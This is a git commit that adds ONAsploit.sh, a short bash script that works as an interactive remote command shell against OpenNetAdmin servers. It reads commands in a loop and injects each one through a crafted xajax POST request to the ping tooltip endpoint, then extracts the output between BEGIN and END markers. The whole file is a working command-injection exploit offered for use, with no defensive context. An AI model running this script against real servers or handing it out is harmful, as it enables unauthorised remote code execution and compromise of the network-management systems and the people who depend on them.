608324d274fa0cfadd25347ad6fa4e3738785fcf
Shawn <41995051+xephora@users.noreply.github.com>
2020-03-15 12:23:11 -0400

    Create ONAsploit.sh

---
+++ ONAsploit.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+
+echo "Usage: ./ONASploit.sh http://vulnerableserver.com/ona"
+URL="${1}"
+while true;do
+ echo -n "$ "; read cmd
+ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
+done
